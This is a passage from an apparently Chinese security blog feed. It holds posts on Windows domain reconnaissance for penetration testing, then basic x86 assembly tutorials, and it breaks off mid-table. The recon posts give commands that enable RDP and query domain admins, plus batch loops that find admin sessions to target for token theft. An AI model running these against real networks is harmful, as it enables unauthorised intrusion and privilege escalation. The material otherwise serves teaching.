<p><img src="https://img-blog.csdnimg.cn/20210307123456171.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=””) call setallowtsconnections 1：开启3389端口</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307123806716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210307123840191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210307123852661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p>whoami /all：查询域信息及域SID，SID是指域内用户的唯一身份，也叫令牌</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307124248556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实我们在日常的信息收集时，可以多点使用<code>vmic</code>这个命令，因为这个命令在往后的横向渗透中会经常使用，所以推荐优先使用这个命令。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>Powershell收集域内信息</title>
    <url>/2021/03/07/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，一个典型的域权限提升过程，通常围绕着收集明文凭据或通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境非常复杂，渗透测试人员无法立即在拥有权限的系统中获得域管理员进程，那么通常采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p>
<p>现在我们来假设一种情况：渗透测试人员在某个内网环境中获得一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，知道哪些用户登录了这台服务器。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时没有域管理员组中的用户登录这台服务器，就可以使用另一个账户并寻找账户在内网的哪台机器上具有管理权限，再枚举这台机器上的用户，然后继续进行渗透测试，直至找到一个可以获取域管理员权限的有效路径为止。</p>
<span id="more"></span>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
<p><strong>net group “Domain Admins” /domain：获取域管理员列表</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307211234765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>tasklist /v：列出本机的所有进程及进程用户</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307211423315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从这里可以看到域管理员都有哪些进程，如果能找到，这将对后面窃取令牌有很大的帮助。</p>
<blockquote>
<p><strong>net group “Domain Controllers” /domain：查询域控制器列表</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307211639715.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>交叉引用域管理员列表与活动会话列表</strong></p>
</blockquote>
<p>对域管理员列表和活动会话列表进行交叉引用，可以确定哪些IP地址有活动域令牌。</p>
<p>首先我们先在域控上连接其中一台远程主机<br><img src="https://img-blog.csdnimg.cn/20210307212138384.png" alt="在这里插入图片描述"><br>在远程目标机器上用powershell能看到连接的主机目标IP(一定要是管理员权限)<br><img src="https://img-blog.csdnimg.cn/20210307212637526.png" alt="在这里插入图片描述"><br>然后我们将域控制器列表添加到dcs.txt中，将域管理员列表添加到admins.txt中<br><img src="https://img-blog.csdnimg.cn/20210307212828102.png" alt="在这里插入图片描述"><br>然后运行一下脚本，会在当前目录下生成一个文本文件sessions.txt</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /F %i <span class="keyword">in</span> (dcs.txt) <span class="keyword">do</span> @<span class="built_in">echo</span> [+] Querying DC %i &amp;&amp; @netsess <span class="literal">-h</span> %i <span class="number">2</span>&gt;null &gt;sessions.txt &amp;&amp; <span class="keyword">FOR</span> /F %a <span class="keyword">in</span> (admins.txt) <span class="keyword">DO</span> @<span class="built_in">type</span> sessions.txt | @findstr /I %a</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307213025308.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>查询远程系统中运行的任务</strong></p>
</blockquote>
<p>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的管理任务。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /F %i <span class="keyword">in</span> (dcs.txt) <span class="keyword">DO</span> @<span class="built_in">echo</span> [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password <span class="number">2</span>&gt;NUL &gt; output.txt &amp;&amp; <span class="keyword">FOR</span> /F %n <span class="keyword">in</span> (admins.txt) <span class="keyword">DO</span> @<span class="built_in">type</span> output.txt | findstr %n &gt; NUL &amp;&amp; <span class="built_in">echo</span> [!] %n was found running a <span class="keyword">process</span> on %i &amp;&amp; pause</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307213500148.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>扫描远程系统的NetBIOS信息</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %i <span class="keyword">in</span> (dcs.txt) <span class="keyword">do</span> @<span class="built_in">echo</span> [+] Checking %i &amp;&amp; nbtstat <span class="literal">-A</span> %i <span class="number">2</span>&gt;NUL &gt;nbsessions.txt &amp;&amp; <span class="keyword">FOR</span> /F %n <span class="keyword">in</span> (admins.txt) <span class="keyword">DO</span> @<span class="built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="built_in">echo</span> [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307213755137.png" alt="在这里插入图片描述"><br>以下脚本作用类似于nbtscan工具</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %i <span class="keyword">in</span> (dcs.txt) <span class="keyword">do</span> @<span class="built_in">echo</span> [+] Checking %i &amp;&amp; nbtscan <span class="operator">-f</span> %i <span class="number">2</span>&gt;NUL &gt;nbsessions.txt &amp;&amp; <span class="keyword">FOR</span> /F %n <span class="keyword">in</span> (admins.txt) <span class="keyword">DO</span> @<span class="built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="built_in">echo</span> [!] %n was found logged into %i</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307213858148.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编基本语句总结</title>
    <url>/2021/03/08/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="进制的定义"><a href="#进制的定义" class="headerlink" title="进制的定义"></a>进制的定义</h2><p>进制是由符号组成，可以自己定义，进位是指向后数一位。</p>
<p>二进制：由两个符号组成，分别是0 、1 逢二进一</p>
<p>八进制：由八个符号组成，分别是0、1、2、3、4、5、6、7 、逢八进一</p>
<p>十进制：由十个符号组成，分别是0、1、2、3、4、5、6、7、8、9、逢十进一</p>
<p>十六进制：由十六个符号组成，分别是0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F、逢十六进一</p>
<p>当然，除了常规的，还有3进制、4进制….n进制，进制的符号不一定是常规的123顺序排列的。</p>
<p>主要作用可以用于加密。进制运算结果本质是通过查表得到的。</p>
<p>16位汇编：实模式，16位处理器内的内部，最多可以处理存储的长度为16位。</p>
<p>32位汇编：保护模式，32位处理器内的内部，最多可以处理存储的长度为32位。</p>
<p>64位汇编：保护模式，64位处理器的内部，最多可以处理存储的长度位64位。</p>
<table>
<thead>
<tr>
<th>位数</th>
<th>通用寄存器</th>
<th>扩展</th>
</tr>
</thead>
<tbody><tr>
<td>16位通用寄存器</td>
<td>AX、BX、 CX、 DX、 SI、 DI、 BP、 SP</td>
<td>R8W、R9W、R10W、R11W、R12W、 R13W、R14W、R15W</td>
</tr>
<tr>
<td>32位通用寄存器</td>
<td>EAX、EBX、ECX、EDX、ESI、EDI、EBP、ESP</td>
<td>R8D、R9D、R10D、R11D、R12D、 R13D、R14D、R15D</td>
</tr>
<tr>
<td>64位通用寄存器</td>
<td>RAX、RBX、RCX、RDX、RSI、RDI、RBP、RSP</td>
<td>R8、R9、R10、R11、R12、 R13、R14、R15</td>
</tr>
</tbody></table>
<p>基本执行环境</p>
<p>32位 ：8个32位通用寄存器，标志寄存器EFLAGS ，指令指针寄存器EIP</p>
<p>64位：16个64位通用寄存器，标志寄存器RFLAGS，指令指针寄存器RIP</p>
<h2 id="常用寄存器结构"><a href="#常用寄存器结构" class="headerlink" title="常用寄存器结构"></a>常用寄存器结构</h2><p>eax : 累加器，操作数和结果数据累加器，返回值运算结果一般都存储在这里</p>
<p>ebx : 基地址，DS段的数据指针，在内存寻址的时候存放基地址</p>
<p>ecx : 计数器，字符串和循环操作的计数器</p>
<p>edx : 用于存储部分乘法结果和部分除法被除数</p>
<p>ebp : 基址指针，SS段的数据指针</p>
<p>esp : 栈帧指针，一般指向栈顶，所以也被称为栈顶指针</p>
<p>edi : 字符串操作的目标指针，ES段的数据指针</p>
<p>esi ：字符串操作的源指针，SS段的数据指针</p>
<p>EFLAGS寄存：包含了独立的二进制位，用于控制CPU操作，或是反应一些CPU操作的结果。有些指令可以测试和控制这些单独的处理器标识位。</p>
<p>EFLAGS寄存器的状态标志(0、2、4、6、7以及11位)指示算术指令（如ADD, SUB, MUL以及DIV指令）的结果，这些状态标志的作用如下：</p>
<p><strong>CF(bit 0) [Carry flag]</strong>   若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置1，反之清零。这个标志指示无符号整型运算的溢出状态，这个标志同样在多倍精度运算(multiple-precision arithmetic)中使用。<br>**PF(bit 2) [Parity flag]**：   如果结果的最低有效字节(least-significant byte)包含偶数个1位则该位置1，否则清零。<br>**AF(bit 4) [Adjust flag]**：   如果算术操作在结果的第3位发生进位或借位则将该标志置1，否则清零。这个标志在BCD(binary-code decimal)算术运算中被使用。<br>**ZF(bit 6) [Zero flag]**：   若结果为0则将其置1，反之清零。<br>**SF(bit 7) [Sign flag]**：   该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负)<br>**OF(bit 11) [Overflow flag]**：   如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该位置1，反之清零。这个标志为带符号整型运算指示溢出状态。<br>在这些状态标志中，只有CF标志能够通过使用STC, CLC以及CMC指令被直接修改，或者通过位指令(BT, BTS, BTR以及BTC)将指定的位拷贝至CF标志中。<br>**DF标志(DF flag)**：这个方向标志(位于EFLAGS寄存器的第10位)控制串指令(MOVS, CMPS, SCAS, LODS以及STOS)。设置DF标志使得串指令自动递减（从高地址向低地址方向处理字符串），清除该标志则使得串指令自动递增。STD以及CLD指令分别用于设置以及清除DF标志。</p>
<p>MMX寄存器：在实现高级多媒体和通信应用时，MMX技术提高了Intel处理器的性能。8个64位MMX寄存器支持成为SIMD的特殊指令。顾名思义，MMX指令对MMX寄存器中的数据值直接进行并行操作。虽然它们看上去是独立的寄存器。但是MMX寄存器实际上是浮点单元中使用的同样寄存器的别名。</p>
<h2 id="visual-studio-2015编写汇编"><a href="#visual-studio-2015编写汇编" class="headerlink" title="visual studio 2015编写汇编"></a>visual studio 2015编写汇编</h2><p>1.建立一个空项目</p>
<p>2.选中项目右键 ”生成自定义“，选择MASM生成规则</p>
<p>3.新建一个.asm后缀的文件</p>
<p>4.选中项目右键 - &gt; 属性 - &gt; 链接器 - &gt; 系统 - &gt; 子系统选&lt;控制台(SUBSYSTEM:CONSOLE)&gt;</p>
<p>5.选中项目右键- &gt; 属性 - &gt; 链接器 - &gt; 高级 - &gt; 入口点填 “main”</p>
<h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><p>加法指令ADD(Addition)</p>
<p>格式：ADD OPRD1,OPRD2</p>
<p>功能：两数相加</p>
<p>加法指令运算的结果对CF、SF、OF、PF、ZF、AF都会有影响</p>
<p>不允许OPRD1与OPRD2同时为存储器</p>
<p>带进位加法指令ADC(Addition Carry)</p>
<p>格式：ADC OPRD1,OPRD2</p>
<p>功能：OPRD1 = OPRD1 + OPRD2 + CF</p>
<h2 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h2><p>减法指令SUB(SUBtract)<br>格式：SUB OPRD1,OPRD2</p>
<p>功能：两个操作数的相减，即从OPRD1减去OPRD2，其结果放在OPRD1中，指令的类型及标识位的影响与ADD指令相同，注意立即数不能用于目的操作数，两个存储器操作数之间不能直接相减，操作数可为8位或16位的无符号数或符号数</p>
<p> 带错位减法指令SBB(SuBtract with Forrow)</p>
<p>格式：SBB OPRD1,OPRD2</p>
<p>功能：进行两个操作数的相减再减去CF进位标志位，即从OPRD1 = OPRD1 - OPRD2  - CF,其结果放在OPRD1中</p>
<h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h2><p>无符号数指令MUL(MULtiply)</p>
<p>格式：MUL OPRD</p>
<p>带符号数指令IMUL(Integer MULtiply)</p>
<p>功能：乘法操作</p>
<p>OPRD为通用寄存器或存储器操作数</p>
<p>本指令会影响标志位CF及OF</p>
<h2 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h2><p>无符号数除法指令DIV(DIVision)</p>
<p>格式：DIV OPRD</p>
<p>功能：实现两个无符号二进制数除法运算</p>
<p>带符号数除法指令IDIV(Integer DIVision)</p>
<p>格式：IDIV OPRD</p>
<p>功能：实现两个带符号数的二进制除法运算</p>
<p>比如16bit 的被除数，分别存在2个8bit寄存器AH：AL，商放在AL,余数在AH</p>
<p>比如32bit 的被除数，分别存在16个8bit寄存器DX：AX，商放在AX,余数在DX</p>
<p>比如64bit 的被除数，分别存在32个8bit寄存器EDX：EAX，商放在RAX,余数在EDX</p>
<p>比如128bit 的被除数，分别存在64个8bit寄存器RDX：RAX，商放在RAX,余数在RDX</p>
<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>加1指令INC(INCrement by 1)</p>
<p>格式：INC OPRD</p>
<p>功能：OPRD = OPRD + 1</p>
<h2 id="自减"><a href="#自减" class="headerlink" title="自减"></a>自减</h2><p>减一指令DEC(Decrement by 1)</p>
<p>格式：DEC OPRD</p>
<p>功能：OPRD = OPRD -1</p>
<h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><p>循环控制指令LOOP</p>
<p>格式：loop 标号</p>
<p>功能：(CX)&lt;—(CX)-1,(CX)&lt;&gt;0,则转移至标号处循环执行，直至(CX)=0,继续执行后指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	mov eax,1</span><br><span class="line">	mov ebx,1</span><br><span class="line">	mov ecx,10</span><br><span class="line">s:</span><br><span class="line">	add eax,ebx</span><br><span class="line">	loop s</span><br><span class="line">	mov eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F;1+2+3 +....+1000</span><br><span class="line">	.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	move eax,0</span><br><span class="line">	move ecx,100</span><br><span class="line">s:</span><br><span class="line">	add eax,ecx</span><br><span class="line">	loop s</span><br><span class="line">	move eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>

<h2 id="什么是堆栈"><a href="#什么是堆栈" class="headerlink" title="什么是堆栈"></a>什么是堆栈</h2><ol>
<li>栈是一个后进先出的存储区域，位于堆栈段中，SS段寄存器描述的就是堆栈段的段地址</li>
<li>栈的数据出口位于栈顶，也就是esp寄存器所指向的位置</li>
<li>栈顶x低位，也就是地址较小的一侧，由ebp寄存器指向的栈低，并不会改变</li>
</ol>
<h2 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h2><p>PUSH：压栈指令，32位汇编首先ESP-4，留出一个空间，然后把要压入栈中的内容压入</p>
<p>POP：出栈指令，32位汇编首先将栈顶的数据弹出给指定的目标，然后ESP+4,清掉空间</p>
<h2 id="MOV指令"><a href="#MOV指令" class="headerlink" title="MOV指令"></a>MOV指令</h2><p>数据传送指令 MOV</p>
<p>格式：MOV OPRD1,OPRD2</p>
<p>功能：将一个源操作数送到目的操作数中，即OPRD1&lt;–OPRD2</p>
<p>说明：</p>
<p>OPRD1为目的操作数，可以说寄存器、存储器、累加器</p>
<p>OPRD2为源操作数，可以数寄存器、存储器、累加器和立即数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	mov eax,ebx</span><br><span class="line">	mov	eax,ecx</span><br><span class="line">	mov ecx,0</span><br><span class="line">	mov eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>
<h2 id="LEA"><a href="#LEA" class="headerlink" title="LEA"></a>LEA</h2><p>有效地址传送指令</p>
<p>格式：LEA OPRD1,OPRD2</p>
<p>功能：将源操作数给出的有效地址传送到指定的寄存器中</p>
<p>OPRD1必须是寄存器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	lea eax,dword ptr ss:[esp-4]</span><br><span class="line">	mov eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>

<h2 id="XCHG"><a href="#XCHG" class="headerlink" title="XCHG"></a>XCHG</h2><p>数据交换指令</p>
<p>格式：XCHG OPRD1,OPRD2，其中OPRD1为目的操作数，OPRD2为源操作数</p>
<p>功能：将两个操作数相互交换位置，该指令把源操作数OPRD2与目的操作数OPRD1交换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	xchg eax,dword ptr ss:[esp-4]</span><br><span class="line">	mov eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>

<h2 id="CMP指令"><a href="#CMP指令" class="headerlink" title="CMP指令"></a>CMP指令</h2><p>比较指令CMP(ComPare)</p>
<p>格式：CMP OPRD1,OPRD2</p>
<p>功能：对两数进行相减，进行比较</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	mov eax,5</span><br><span class="line">	mov ebx,4</span><br><span class="line">	cmp eax,ebx</span><br><span class="line">	cmp eax,4</span><br><span class="line">	mov eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>

<h2 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h2><p>测试指令</p>
<p>格式：TEST OPRD1,OPRD2</p>
<p>功能：其中OPRD1、OPRD2的含义同AND指令一样，也是对两个操作数进行按位的‘与‘运算，—-唯一不同之处是不讲’与‘的结果送目的操作数，即本指令对两个操作数的内容均不进行修改，仅数载逻辑与操作后，对标志位重新置位</p>
<h2 id="常用的JCC指令"><a href="#常用的JCC指令" class="headerlink" title="常用的JCC指令"></a>常用的JCC指令</h2><p>JMP：无条件跳转</p>
<p>JZ/JE：ZF = 1等于0或相等调整</p>
<p>JNZ/JNE：ZF = 0 不等于0或者不相等跳转</p>
<p>JBE/JNA：CF = 1/ZF = 1 低于等于或者不高于跳转</p>
<p>JNBE/JA：CF = 0 / ZF = 0 不低于等于/高于跳转</p>
<p>JL/JNGE：SF != OF 小于/不大于等于跳转</p>
<p>JNL/JGE：SF = OF 不小于/大于等于跳转</p>
<h2 id="MOVS指令"><a href="#MOVS指令" class="headerlink" title="MOVS指令"></a>MOVS指令</h2><p>字符串传送指令MOVS</p>
<p>格式：MOVS OPRD1，OPRD2</p>
<p>—MOVSB</p>
<p>​    MOVSW</p>
<p>功能：OPRD1&lt;—OPRD2</p>
<p>说明：</p>
<ol>
<li>其中OPRD2为源串符号地址</li>
<li>OPRD1为目的串符号地址</li>
</ol>
<h2 id="STOS指令"><a href="#STOS指令" class="headerlink" title="STOS指令"></a>STOS指令</h2><p>字符串存储指令</p>
<p>格式：STOS OPRD</p>
<p>功能：把AL(字节)或AX(字)中的数据存储到DI为目的串地址指针所寻址的存储器单元中去指针DI将根据DF的值进行自动调整</p>
<h2 id="REP指令"><a href="#REP指令" class="headerlink" title="REP指令"></a>REP指令</h2><p>重复前缀的说明</p>
<p>格式：REP                 ；CX&lt;&gt;0重复执行字符串指令</p>
<p>​            REPZ/REPE    ；CX&lt;&gt;0且ZF = 1重复执行字符串指令</p>
<p>​            REPNZ/RPNE ; CX&lt;&gt;0且ZF = 1重复执行字符串指令</p>
<p>功能：在串操作指令前加上重复前缀，可以对字符串进行重复处理，由于加上重复前缀后，对应的指令代码是不同的，所以指令的功能便具有重复处理的功能，重复的次数存放在CX寄存器中</p>
<h2 id="CALL指令"><a href="#CALL指令" class="headerlink" title="CALL指令"></a>CALL指令</h2><p>过程调用指令</p>
<p>格式：CALL OPRD</p>
<p>功能：过程调用指令</p>
<p>相当于：</p>
<p>​            push eip</p>
<p>​            amp OPRD</p>
<h2 id="RETN指令"><a href="#RETN指令" class="headerlink" title="RETN指令"></a>RETN指令</h2><p>返回指令，相当于：</p>
<p>​            pop eip</p>
<p>​            jmp eip</p>
<h2 id="过程调用-函数"><a href="#过程调用-函数" class="headerlink" title="过程调用-函数"></a>过程调用-函数</h2><p>过程调用的方式：</p>
<p>​        function proc</p>
<p>​            code</p>
<p>​        function endp</p>
<p>参数传递方式：</p>
<ol>
<li>寄存器传参</li>
<li>堆栈传参</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">addx proc</span><br><span class="line">		add eax,ebx</span><br><span class="line">addx endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line">		mov eax,1</span><br><span class="line">		mov ebx,2</span><br><span class="line">		call addx</span><br><span class="line">		mov eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.code</span><br><span class="line">addx proc</span><br><span class="line">		mov eax,[esp + 4]</span><br><span class="line">		mov ebx,[esp + 8]</span><br><span class="line">		add eax,ebx</span><br><span class="line">		ret</span><br><span class="line">addx endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line">		push 1</span><br><span class="line">		push 2</span><br><span class="line">		call addx</span><br><span class="line">		mov eax,eax</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>



<p>Win32 第一个hello word程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">ExitProcess PROTO,dwExitCode:DWORD</span><br><span class="line">MessageBoxA PROTO hWnd:DWORD,IpText:BYTE,IpCaption:BYTE,uType:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">string db &quot;hello word！&quot;,0</span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line">	push 0</span><br><span class="line">	lea eax,string</span><br><span class="line">	push eax</span><br><span class="line">	push eax</span><br><span class="line">	push 0</span><br><span class="line">	call MessageBoxA</span><br><span class="line">	add esp,16	;堆栈平衡,push一个dword4个字节，一共push了4个，共16个字节</span><br><span class="line">	call ExitProcess</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编基本语句总结</title>
    <url>/2021/03/08/%E6%B1%87%E7%BC%96%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="汇编基本语句总结"><a href="#汇编基本语句总结" class="headerlink" title="汇编基本语句总结"></a>汇编基本语句总结</h1><p>[toc]</p>
<p> （目的寄存器：保存结果的寄存器）</p>
<h2 id="一、-基本框架"><a href="#一、-基本框架" class="headerlink" title="一、 基本框架"></a>一、 基本框架</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat, stdcall</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	mov eax, 1</span><br><span class="line">	mov ebx, 2</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>



<h2 id="二、基本运算"><a href="#二、基本运算" class="headerlink" title="二、基本运算"></a>二、基本运算</h2><h3 id="1-加"><a href="#1-加" class="headerlink" title="1. 加"></a>1. 加</h3><ul>
<li>自增用法：<code>INC  寄存器名（incrementing）</code></li>
<li>加法用法：<code>ADD 目的寄存器,  寄存器名或数值（addition）</code></li>
</ul>
<h3 id="2-减法"><a href="#2-减法" class="headerlink" title="2. 减法"></a>2. 减法</h3><ul>
<li>自减用法：<code>DEC 寄存器名（decrementing）</code></li>
<li>减法用法：<code>SUB 目的寄存器，寄存器名或数值（subtraction）</code></li>
</ul>
<h3 id="3-乘法"><a href="#3-乘法" class="headerlink" title="3. 乘法"></a>3. 乘法</h3><ul>
<li>用法：<code>mul 倍数（寄存器）</code></li>
</ul>
<h4 id="通用寄存器表"><a href="#通用寄存器表" class="headerlink" title="通用寄存器表"></a>通用寄存器表</h4><p><img src="C:\Users\LITTLECHIEH\AppData\Roaming\Typora\typora-user-images\image-20200212001849964.png" alt="image-20200212001849964"></p>
<p>倍数会决定<strong>计算结果存储位置</strong>，也会决定<strong>被乘数的所在范围</strong>：</p>
<ul>
<li>当大小为 1 字节：<img src="https://www.tutorialspoint.com/assembly_programming/images/arithmetic1.jpg" alt="Arithmetic1"></li>
<li>当大小为 2 字节：<img src="https://www.tutorialspoint.com/assembly_programming/images/arithmetic2.jpg" alt="Arithmetic2"></li>
<li>当大小为 4 字节：<img src="C:\Users\LITTLECHIEH\AppData\Roaming\Typora\typora-user-images\image-20200213040532241.png" alt="image-20200213040532241"></li>
</ul>
<h3 id="4-除法"><a href="#4-除法" class="headerlink" title="4. 除法"></a>4. 除法</h3><ul>
<li><p>除法：<code>div 除数（分母，寄存器）</code></p>
<p>其中 Quotient 是商，Remainder 是余数，Divisor 是除数</p>
<p>类似乘法，除数也会有类似的作用。</p>
<ul>
<li>当大小为 1 字节：<img src="https://www.tutorialspoint.com/assembly_programming/images/arithmetic4.jpg" alt="Arithmetic4"></li>
<li>当大小为 2 字节：<img src="https://www.tutorialspoint.com/assembly_programming/images/arithmetic5.jpg" alt="Arithmetic5"></li>
<li>当大小为 4 字节：<img src="https://www.tutorialspoint.com/assembly_programming/images/arithmetic6.jpg" alt="Arithmetic6"></li>
</ul>
</li>
</ul>
<h2 id="三、逻辑运算"><a href="#三、逻辑运算" class="headerlink" title="三、逻辑运算"></a>三、逻辑运算</h2><p>语句和加类似，讲运算结果放入<code>operand1</code>（操作数1）</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">指令</th>
<th align="center">格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">AND 与</td>
<td align="center">AND operand1, operand2</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">OR 或</td>
<td align="center">OR operand1, operand2</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">XOR 异或</td>
